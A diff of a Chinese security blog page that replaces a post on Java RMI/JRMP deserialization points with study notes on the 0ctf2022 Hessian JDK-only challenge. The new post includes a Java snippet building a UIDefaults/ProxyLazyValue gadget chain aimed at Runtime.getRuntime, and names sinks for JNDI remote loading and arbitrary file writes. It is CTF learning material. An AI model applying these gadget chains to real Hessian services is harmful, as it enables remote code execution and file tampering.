@@ -16,7 +16,7 @@
   <meta name="description" content="摸鱼">
   <meta name="author" content="Aluvion">
   <meta name="keywords" content="">
-  <title>Java反序列化中的RMI、JRMP、JNDI、LDAP(2) - Twings</title>
+  <title>Hessian JDK反序列化漏洞2 - Twings</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
 <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
@@ -117,7 +117,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期日, 二月 27日 2022, 11:37 晚上
+                  星期五, 二月 10日 2023, 9:23 晚上
                 </p>
               
 
@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    990 字
+                    1k 字
                   </span>
                 
 
@@ -134,7 +134,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      3 分钟
+                      5 分钟
                   </span>
                 
 
@@ -169,89 +169,173 @@
           <div class="post-content mx-auto" id="post">
             
             <div class="markdown-body">
-              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>乱七八糟的东西。</p>
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习！0ctf2022 hessian-only-jdk相关危险操作点。</p>
 <a id="more"></a>
 <hr>
-<h3 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h3><p>找一找Java里有没有其他不受黑白名单限制，又可以通过反序列化触发的反序列化点。</p>
-<p>简单来说就是存在重开InputStream操作的类，要么是可序列化类，要么存在发起连接操作，不然数据就要通过别的可序列化类传递过来，不好控制。</p>
-<p>有一些叫做getObject的函数，比如SignedObject、SealedObject，然而没有什么会调用他们的地方。</p>
-<h4 id="MarshalledObject"><a href="#MarshalledObject" class="headerlink" title="MarshalledObject"></a>MarshalledObject</h4><p>其get函数如下：</p>
-<pre><code class="java">public T get() throws IOException, ClassNotFoundException {
-    if (objBytes == null)   // must have been a null object
+<h3 id="SwingLazyValue"><a href="#SwingLazyValue" class="headerlink" title="SwingLazyValue"></a>SwingLazyValue</h3><p>好像都要用到这个类，看看这是个什么东西。</p>
+<p>一眼就能看到这个神奇函数：</p>
+<pre><code class="java">public Object createValue(UIDefaults var1) {
+    try {
+        ReflectUtil.checkPackageAccess(this.className);
+        Class var2 = Class.forName(this.className, true, (ClassLoader)null);
+        Class[] var3;
+        if (this.methodName != null) {
+            var3 = this.getClassArray(this.args);
+            Method var6 = var2.getMethod(this.methodName, var3);
+            this.makeAccessible(var6);
+            return var6.invoke(var2, this.args);
+        } else {
+            var3 = this.getClassArray(this.args);
+            Constructor var4 = var2.getConstructor(var3);
+            this.makeAccessible(var4);
+            return var4.newInstance(this.args);
+        }
+    } catch (Exception var5) {
         return null;
+    }
+}
+</code></pre>
+<p>输入参数竟然毫无用处，createValue函数给出了两个选择：</p>
+<ul>
+<li><p>由于invoke主体为Class，所以只能用于调用一次参数可控的静态函数</p>
+</li>
+<li><p>或者调用一次参数可控的构造函数</p>
+</li>
+</ul>
+<p>值得注意的一点是在通过Class.forName加载类时：</p>
+<pre><code class="java">Class var2 = Class.forName(this.className, true, (ClassLoader)null);
+</code></pre>
+<p>没有传入classloader，那么使用的应该是BootstrapClassLoader，而它只能加载rt.jar里面的类。</p>
+<h3 id="ProxyLazyValue"><a href="#ProxyLazyValue" class="headerlink" title="ProxyLazyValue"></a>ProxyLazyValue</h3><p>SwingLazyValue继承自LazyValue接口，看看这个接口下的其他类，会发现ProxyLazyValue，其createValue函数也有类似的操作：</p>
+<pre><code class="java">Class&lt;?&gt; c;
+Object cl;
+// See if we should use a separate ClassLoader
+if (table == null || !((cl = table.get(&quot;ClassLoader&quot;))
+                        instanceof ClassLoader)) {
+    cl = Thread.currentThread().
+                getContextClassLoader();
+    if (cl == null) {
+        // Fallback to the system class loader.
+        cl = ClassLoader.getSystemClassLoader();
+    }
+}
+ReflectUtil.checkPackageAccess(className);
+c = Class.forName(className, true, (ClassLoader)cl);
+SwingUtilities2.checkAccess(c.getModifiers());
+if (methodName != null) {
+    Class[] types = getClassArray(args);
+    Method m = c.getMethod(methodName, types);
+    return MethodUtil.invoke(m, c, args);
+} else {
+    Class[] types = getClassArray(args);
+    Constructor constructor = c.getConstructor(types);
+    SwingUtilities2.checkAccess(constructor.getModifiers());
+    return constructor.newInstance(args);
+}
+</code></pre>
+<p>可以看到，这里的同样可以调用静态函数和构造函数，不同的是这里加载类时的classloader不是null。</p>
+<h3 id="LazyValue调用链"><a href="#LazyValue调用链" class="headerlink" title="LazyValue调用链"></a>LazyValue调用链</h3><p>UIDefaults类的getFromHashtable函数可以，UIDefaults虽然是Map类，但是其存在public的无参构造函数，并且本身是个public类，所以不会被hessian吃掉。</p>
+<p>再往上是get函数，所以找一个Map.get就行了，比如HashTable的equals函数就可以。</p>
+<p>简单构造一个HashMap包含两个UIDefaults就行：</p>
+<pre><code class="java">Object proxyLazyValue = Utils.createWithoutConstructor(&quot;javax.swing.UIDefaults$ProxyLazyValue&quot;);
+Utils.setField(proxyLazyValue, &quot;className&quot;, &quot;java.lang.Runtime&quot;);
+Utils.setField(proxyLazyValue, &quot;methodName&quot;, &quot;getRuntime&quot;);
+Utils.setField(proxyLazyValue, &quot;args&quot;, new Object[]{});
 
-    ByteArrayInputStream bin = new ByteArrayInputStream(objBytes);
-    // locBytes is null if no annotations
-    ByteArrayInputStream lin =
-        (locBytes == null ? null : new ByteArrayInputStream(locBytes));
-    MarshalledObjectInputStream in =
-        new MarshalledObjectInputStream(bin, lin, objectInputFilter);
-    @SuppressWarnings(&quot;unchecked&quot;)
-    T obj = (T) in.readObject();
-    in.close();
-    return obj;
+UIDefaults map1 = new UIDefaults();
+map1.put(1, proxyLazyValue);
+UIDefaults map2 = new UIDefaults();
+map2.put(1, proxyLazyValue);
+HashMap bigMap = new HashMap();
+bigMap.put(1, 1);
+bigMap.put(2, 2);
+Object[] table = (Object[])Utils.getFieldValue(bigMap, &quot;table&quot;);
+Utils.setField(table[1], &quot;key&quot;, map1);
+Utils.setField(table[2], &quot;key&quot;, map2);
+
+unserialize(serialize(bigMap));
+</code></pre>
+<p>根据参考文章，也可以走java.awt.datatransfer.MimeTypeParameterList进来：</p>
+<pre><code class="java">StringBuilder buffer = new StringBuilder(parameters.size() * 16);
+
+Enumeration&lt;String&gt; keys = parameters.keys();
+while(keys.hasMoreElements())
+{
+    buffer.append(&quot;; &quot;);
+
+    String key = keys.nextElement();
+    buffer.append(key);
+    buffer.append(&#39;=&#39;);
+        buffer.append(quote(parameters.get(key)));
+}
+
+return buffer.toString();
+</code></pre>
+<p>最后用XString连上这里的toString就好了。</p>
+<h3 id="sun-tools-jar-Main"><a href="#sun-tools-jar-Main" class="headerlink" title="sun.tools.jar.Main"></a>sun.tools.jar.Main</h3><p>获得静态函数调用最后就是就要找地方完成利用了，sun.tools.jar.Main.main：</p>
+<pre><code class="java">public static void main(String[] var0) {
+    Main var1 = new Main(System.out, System.err, &quot;jar&quot;);
+    System.exit(var1.run(var0) ? 0 : 1);
 }
 </code></pre>
-<p>看起来是可控的，然而看到这里有一个碍眼的objectInputFilter，它在readObject时会被赋值：</p>
-<pre><code class="java">private void readObject(ObjectInputStream stream)
-    throws IOException, ClassNotFoundException {
-    stream.defaultReadObject();     // read in all fields
-    objectInputFilter = ObjectInputFilter.Config.getObjectInputFilter(stream);
+<p>Main.run似乎可以写入jar文件：</p>
+<pre><code class="java">Packer var11 = Pack200.newPacker();
+SortedMap var12 = var11.properties();
+var12.put(&quot;pack.effort&quot;, &quot;1&quot;);
+var8 = new JarFile(var5.getCanonicalPath());
+var9 = this.createTemporaryFile(var7, &quot;.pack&quot;);
+var4 = new FileOutputStream(var9);
+var11.pack(var8, var4);
+var10 = new JarOutputStream(var6);
+Unpacker var13 = Pack200.newUnpacker();
+var13.unpack(var9, var10);
+</code></pre>
+<p>但是内容不可控。</p>
+<p>其他代码块里，有文件写入、文件解压的功能：</p>
+<pre><code class="java">var47 = this.fname == null ? new FileInputStream(FileDescriptor.in) : new FileInputStream(this.fname);
+
+try {
+    this.extract((InputStream)(new BufferedInputStream(var47)), this.files);
+} finally {
+    var47.close();
 }
 </code></pre>
-<p>getObjectInputFilter会从原本的InputStream中取出其InputFilter：</p>
-<pre><code class="java">public static ObjectInputFilter getObjectInputFilter(ObjectInputStream var0) {
-    Objects.requireNonNull(var0, (String)&quot;inputStream&quot;);
-    return SharedSecrets.getJavaOISAccess().getObjectInputFilter(var0);
-}
+<p>但是源是另一个文件，所以这个函数使用条件比较苛刻。</p>
+<h3 id="com-sun-org-apache-xalan-internal-xslt-main"><a href="#com-sun-org-apache-xalan-internal-xslt-main" class="headerlink" title="com.sun.org.apache.xalan.internal.xslt._main"></a>com.sun.org.apache.xalan.internal.xslt._main</h3><p>看起来可以跟TemplatesImpl联动：</p>
+<pre><code class="java">Source source = stf.getAssociatedStylesheet(new StreamSource(inFileName), media, null, null);
+
+if (null != source)
+    stylesheet = tfactory.newTemplates(source);
 </code></pre>
-<p>所以原本反序列化流程中存在的InputFilter也会影响这里的反序列化。</p>
-<p>想要通过反序列化操作调用这里的get函数，就要调用ActivatableRef类的invoke函数，即RemoteRef接口的invoke函数，但是反序列化过程中方便触发的点位于RemoteObjectInvocationHandler函数中，需要使用动态代理，还需要代理的接口继承了Remote。</p>
-<p>整条利用链应该跟以前学习过的JRMP绕过类似，这里就不验证了。</p>
-<h4 id="RegistryImpl-Skel"><a href="#RegistryImpl-Skel" class="headerlink" title="RegistryImpl_Skel"></a>RegistryImpl_Skel</h4><p>即RMI中注册中心使用的反序列化点，该类不可序列化。</p>
-<p>当通过LocateRegistry.createRegistry创建注册中心时会实例化一个RegistryImpl对象：</p>
-<pre><code class="java">public static Registry createRegistry(int port) throws RemoteException {
-    return new RegistryImpl(port);
-}
-</code></pre>
-<p>其构造函数会开始建立监听并通过registryFilter函数注册反序列化白名单：</p>
-<pre><code class="java">public RegistryImpl(final int var1) throws RemoteException {
-    this.bindings = new Hashtable(101);
-    if (var1 == 1099 &amp;&amp; System.getSecurityManager() != null) {
-        try {
-            AccessController.doPrivileged((PrivilegedExceptionAction)(new PrivilegedExceptionAction&lt;Void&gt;() {
-                public Void run() throws RemoteException {
-                    LiveRef var1x = new LiveRef(RegistryImpl.id, var1);
-                    RegistryImpl.this.setup(new UnicastServerRef(var1x, (var0) -&gt; {
-                        return RegistryImpl.registryFilter(var0);
-                    }));
-                    return null;
-                }
-            }), (AccessControlContext)null, new SocketPermission(&quot;localhost:&quot; + var1, &quot;listen,accept&quot;));
-        } 
-        ...
-    } else {
-        LiveRef var2 = new LiveRef(id, var1);
-        this.setup(new UnicastServerRef(var2, RegistryImpl::registryFilter));
+<p>但是输入也是文件。</p>
+<h3 id="System-setProperty"><a href="#System-setProperty" class="headerlink" title="System.setProperty"></a>System.setProperty</h3><p>可以修改属性：</p>
+<pre><code class="java">public static String setProperty(String key, String value) {
+    checkKey(key);
+    SecurityManager sm = getSecurityManager();
+    if (sm != null) {
+        sm.checkPermission(new PropertyPermission(key,
+            SecurityConstants.PROPERTY_WRITE_ACTION));
     }
 
+    return (String) props.setProperty(key, value);
 }
 </code></pre>
-<h4 id="RegistryImpl-Stub"><a href="#RegistryImpl-Stub" class="headerlink" title="RegistryImpl_Stub"></a>RegistryImpl_Stub</h4><p>位于其list函数和lookup函数中，依旧是RMI中注册中心使用的反序列化点，该类不可序列化。</p>
-<p>同样受到白名单影响。</p>
-<h4 id="UnicastRef"><a href="#UnicastRef" class="headerlink" title="UnicastRef"></a>UnicastRef</h4><p>即RMI中服务端使用的反序列化点，其unmarshalValue函数中会有一个反序列化操作，用于反序列化客户端传输过来的对象。</p>
-<p>可反序列化，有两条路可以来到该反序列化点，第一是跟MarshalledObject类似，同样是调用RemoteRef接口的invoke函数，但是需要满足的条件更多，需要代理的函数返回类型不是Int、Boolean等主要类型。</p>
-<p>第二就是走正常途径，通过反序列化搞定一个RMI服务端了，听起来就不可靠。</p>
-<h4 id="DGCImpl-Skel"><a href="#DGCImpl-Skel" class="headerlink" title="DGCImpl_Skel"></a>DGCImpl_Skel</h4><p>位于dispatch函数中，即JRMPListener利用链使用的反序列化点，会受到DGCImpl类的白名单影响。</p>
-<h4 id="DGCImpl-Stub"><a href="#DGCImpl-Stub" class="headerlink" title="DGCImpl_Stub"></a>DGCImpl_Stub</h4><p>位于dirty函数中，即JRMPClient利用链使用的反序列化点，同样会受到DGCImpl类的白名单影响。</p>
-<h4 id="StreamRemoteCall"><a href="#StreamRemoteCall" class="headerlink" title="StreamRemoteCall"></a>StreamRemoteCall</h4><p>位于executeCall函数中，同样有两条路径，第一条与MarshalledObject相似，通过RemoteRef接口的invoke函数触发，即以前学习过的JRMP反序列化绕过利用链。</p>
-<p>第二条不怎么可信，走DGCImpl_Stub的clean、dirty函数会受到白名单影响，走RegistryImpl_Stub的话它的ref成员又无法通过反序列化控制。</p>
-<h3 id="触发RemoteRef接口的invoke函数"><a href="#触发RemoteRef接口的invoke函数" class="headerlink" title="触发RemoteRef接口的invoke函数"></a>触发RemoteRef接口的invoke函数</h3><p>可控触发点位于RemoteObjectInvocationHandler类中，需要用其代理一个Remote子接口中定义的函数才能触发。</p>
-<h4 id="RMIServer"><a href="#RMIServer" class="headerlink" title="RMIServer"></a>RMIServer</h4><p>存在一个getVersion函数，或许可以跟fastjson之类的会调用getter的东西一起用？</p>
-<h4 id="ActivationInstantiator"><a href="#ActivationInstantiator" class="headerlink" title="ActivationInstantiator"></a>ActivationInstantiator</h4><p>往上追又到了Activator接口的activate函数，没必要看了。</p>
-<h4 id="Activator"><a href="#Activator" class="headerlink" title="Activator"></a>Activator</h4><p>有一个activate函数，要通过RemoteRef接口的invoke函数触发。</p>
-<hr>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3>
+<p>比如高版本限制JNDI注入的就是com.sun.jndi.rmi.object.trustURLCodebase、java.rmi.server.useCodebaseOnly等系统属性，修改这些属性可以加载远程对象。</p>
+<h3 id="System-setProperty-InitialContext-doLookup"><a href="#System-setProperty-InitialContext-doLookup" class="headerlink" title="System.setProperty + InitialContext.doLookup"></a>System.setProperty + InitialContext.doLookup</h3><p>可以触发JNDI注入加载远程对象。</p>
+<h3 id="com-sun-org-apache-xml-internal-security-utils-JavaUtils"><a href="#com-sun-org-apache-xml-internal-security-utils-JavaUtils" class="headerlink" title="com.sun.org.apache.xml.internal.security.utils.JavaUtils"></a>com.sun.org.apache.xml.internal.security.utils.JavaUtils</h3><p>writeBytesToFilename静态函数：</p>
+<pre><code class="java">public static void writeBytesToFilename(String filename, byte[] bytes) {
+    if (filename != null &amp;&amp; bytes != null) {
+        try (OutputStream outputStream = Files.newOutputStream(Paths.get(filename))) {
+            outputStream.write(bytes);
+        } catch (IOException ex) {
+            LOG.debug(ex.getMessage(), ex);
+        }
+    } else {
+        LOG.debug(&quot;writeBytesToFilename got null byte[] pointed&quot;);
+    }
+}
+</code></pre>
+<h2 id="可以完全控制内容地写入一个文件，简直无敌。"><a href="#可以完全控制内容地写入一个文件，简直无敌。" class="headerlink" title="可以完全控制内容地写入一个文件，简直无敌。"></a>可以完全控制内容地写入一个文件，简直无敌。</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3>
             </div>
             <hr>
             <div>
@@ -267,10 +351,6 @@
                     
                       <a class="hover-with-bg" href="/tags/反序列化/">反序列化</a>
                     
-                      <a class="hover-with-bg" href="/tags/JRMP/">JRMP</a>
-                    
-                      <a class="hover-with-bg" href="/tags/JNDI/">JNDI</a>
-                    
                   </span>
                 
               </p>
@@ -281,16 +361,11 @@
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
                     
-                      <a href="/2022/03/03/SpringBoot框架下的JNDI利用法探索/">
-                        <i class="fa fa-chevron-left"></i>
-                        <span>SpringBoot框架下的JNDI利用法探索</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-12 col-md-6">
                     
-                      <a href="/2022/02/25/机器学习入门5/">
-                        <span>机器学习入门5</span>
+                      <a href="/2023/02/09/Hessian-JDK反序列化漏洞/">
+                        <span>Hessian JDK反序列化漏洞</span>
                         <i class="fa fa-chevron-right"></i>
                       </a>
                     
@@ -463,7 +538,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Java反序列化中的RMI、JRMP、JNDI、LDAP(2)&nbsp;",
+        "Hessian JDK反序列化漏洞2&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
